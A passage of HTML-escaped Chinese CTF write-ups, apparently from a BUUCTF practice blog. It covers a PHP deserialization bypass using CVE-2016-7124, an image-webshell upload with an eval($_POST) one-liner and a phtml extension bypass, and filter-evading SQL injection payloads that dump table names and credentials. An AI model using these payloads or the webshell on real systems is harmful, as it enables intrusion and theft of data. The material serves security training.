class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$username&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$password&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;username = &lt;span class=&#34;variable&#34;&gt;$username&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;password = &lt;span class=&#34;variable&#34;&gt;$password&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__wakeup&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;username = &lt;span class=&#34;string&#34;&gt;&amp;#x27;guest&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__destruct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;password != &lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/br&amp;gt;NO!!!hacker!!!&amp;lt;/br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;You name is: &amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;username;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;You password is: &amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;password;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;username === &lt;span class=&#34;string&#34;&gt;&amp;#x27;admin&amp;#x27;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$flag&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$flag&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/br&amp;gt;hello my friend~~&amp;lt;/br&amp;gt;sorry i can&amp;#x27;t give you the flag!&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;O:&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;Name&amp;quot;&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;:&amp;#123;s:&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;username&amp;quot;&lt;/span&gt;;s:&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;;s:&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;password&amp;quot;&lt;/span&gt;;i:&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;从__destruct () 函数中的逻辑来看，只有当 password=100，username=admin 时，会输出 flag 的值&lt;/p&gt;
&lt;p&gt;__construct 构造函数会将我们传入的值赋值给变量 password 和 username，但是在反序列化后会调用__wakeup ()，将 username 赋值为 guest&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CVE-2016-7124：当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup 的执行&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;👆👆👆通过上述漏洞可以跳过__wakeup () 的执行&lt;/p&gt;
&lt;p&gt;构造 exp.php&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;Class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Name&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$username&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;nonono&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$password&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;yesyes&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Name();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; serialize(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;O:&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;Name&amp;quot;&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;：&amp;#123;s:&lt;span class=&#34;number&#34;&gt;14&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;Nameusername&amp;quot;&lt;/span&gt;;s:&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;;s:&lt;span class=&#34;number&#34;&gt;14&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;Namepassword&amp;quot;&lt;/span&gt;;s:&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;100&amp;quot;&lt;/span&gt;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;但是用 url 编码输出为：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;O%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A4%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A%&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;Name%&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A2%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A%&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;Bs%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A14%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A%&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;Name%&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;username%&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;Bs%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A5%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A%&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;admin%&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;Bs%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A14%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A%&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;Name%&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;password%&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;Bs%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A3%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A%&lt;span class=&#34;number&#34;&gt;22100&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;B%&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;D&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在 Nameusername，Namepassword 中，类名以及变量名前都存在不可见字符 %00&lt;/p&gt;
&lt;p&gt;因为 private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上 ascii 为 0 的字符 (不可见字符)&lt;/p&gt;
&lt;p&gt;⭐payload 需要修改的地方为成员变量个数，以及私有字段前增加 %00 (url 编码的不可见字符)&lt;/p&gt;
&lt;p&gt;payload：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;select=O:&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;Name&amp;quot;&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;:&amp;#123;s:&lt;span class=&#34;number&#34;&gt;14&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;%00Name%00username&amp;quot;&lt;/span&gt;;s:&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;;s:&lt;span class=&#34;number&#34;&gt;14&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;%00Name%00password&amp;quot;&lt;/span&gt;;i:&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;总结&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;🌰&lt;a href=&#34;https://mayi077.gitee.io/2020/03/04/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6/&#34;&gt;备份文件参考&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;常见的网站源码备份文件后缀：tar、tar.gz、zip、rar&lt;/p&gt;
&lt;p&gt;常见的网站源码备份文件名：web、website、backup、back、www、wwwroot、temp&lt;/p&gt;
&lt;p&gt;🌰&lt;a href=&#34;https://www.php.net/manual/zh/language.oop5.magic.php&#34;&gt;php 魔术方法&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;serialize () 时，若存在__sleep ()，会先调用__sleep ()，再执行序列化操作&lt;/p&gt;
&lt;p&gt;unserialize () 时，若存在__wakeup ()，反序列化后会调用__wakeup ()&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;actf2020-新生赛-upload1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#actf2020-新生赛-upload1&#34;&gt;#&lt;/a&gt; ACTF2020 新生赛 Upload1&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;关键词：图片马&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;🐴合成图片马命令：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;copy 2.jpg/b + shell.php/a shell.jpg&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上传 shell.jpg，抓包更改后缀名为 php，回显 nonono~ Bad file！&lt;/p&gt;
&lt;p&gt;更改后缀名为随机乱码字符，回显上传成功，目测设置黑名单&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;buuctf-web1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;设置 phtml 后缀名，绕过成功&lt;/p&gt;
&lt;p&gt;shell.php：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script language=&amp;quot;php&amp;quot;&amp;gt;eval($_POST[&amp;#x27;shell&amp;#x27;]);&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;合成图片马，上传改后缀，连 shell&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;极客大挑战-2019-babysql1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#极客大挑战-2019-babysql1&#34;&gt;#&lt;/a&gt; 极客大挑战 2019 BabySQL1&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;关键词：sql 注入、过滤关键字、过滤特殊符号、字符拼接&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;看题，登录框 sql 注入&lt;/p&gt;
&lt;p&gt;经测试，发现过滤字符：select，sleep，*，and，or，union…&lt;/p&gt;
&lt;p&gt;哈哈很多常用的嘛，不测了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;buuctf-web2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;考虑使用字符拼接绕过关键词检测，%2b 为’+‘url 编码，直接使用’+&#39; 会被转成空格，payload：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?username&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;admin&lt;span class=&#34;string&#34;&gt;&amp;#x27; an%2bd+slee%2bp(10)--+&amp;amp;password=111&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后看着题目，发现过滤的关键字都置空的，双写也能绕过&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?username&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;admin&lt;span class=&#34;string&#34;&gt;&amp;#x27; anandd sleesleepp(10)--+&amp;amp;password=111&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;打点到此结束⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐&lt;/p&gt;
&lt;p&gt;直接登录获得的并不是 flag，继续找 ，order by 发现为 3 个字段&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?username&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;admin&lt;span class=&#34;string&#34;&gt;&amp;#x27; o%2brder b%2by 4--+&amp;amp;password=111&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;回显的字段为 2，3&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?username&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;admin&lt;span class=&#34;operator&#34;&gt;&amp;amp;&lt;/span&gt;password&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;111&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; uni%2bon sele%2bct 1,2,3--+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;爆表，从 information_schema.tables 中查找当前数据库所有表名，拼接在一起后在第二个字段输出&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?username&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;admin&lt;span class=&#34;operator&#34;&gt;&amp;amp;&lt;/span&gt;password&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;111&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; uni%2bon sele%2bct 1,group_concat(table_name),3 fr%2bom info%2brmation_schema.tables whe%2bre ta%2bble_schema=database()--+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;爆字段&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?username&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;admin&lt;span class=&#34;operator&#34;&gt;&amp;amp;&lt;/span&gt;password&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;111&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; uni%2bon sele%2bct 1,group_concat(column_name),3 fr%2bom info%2brmation_schema.columns whe%2bre ta%2bble_name=&amp;#x27;&lt;/span&gt;b4bsql&lt;span class=&#34;string&#34;&gt;&amp;#x27;--+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Hello id,username,password！&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后发现两个表字段都是一样的，那找 b4bsql 中的数据吧&lt;/p&gt;
&lt;p&gt;拼接每行数据，并用 — 隔开&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?username&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;admin&lt;span class=&#34;operator&#34;&gt;&amp;amp;&lt;/span&gt;password&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;111&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; uni%2bon sele%2bct 1,group_concat(concat_ws(&amp;#x27;&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;---&amp;#x27;,username,passwo%2brd)),3 fr%2bom b4bsql--+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;buuctf-web3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;总结&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/apolloren/p/11002449.html&#34;&gt;SQL 字符串拼接&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;actf2020-新生赛-backupfile1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#actf2020-新生赛-backupfile1&#34;&gt;#&lt;/a&gt; ACTF2020 新生赛 BackupFile1&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;关键词：is_numeric () 绕过，== 绕过，php 弱类型比较表&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;看题，找备份文件，index.php.bak&lt;/p&gt;
&lt;p&gt;🐴index.php 代码如下：&lt;/p&gt;
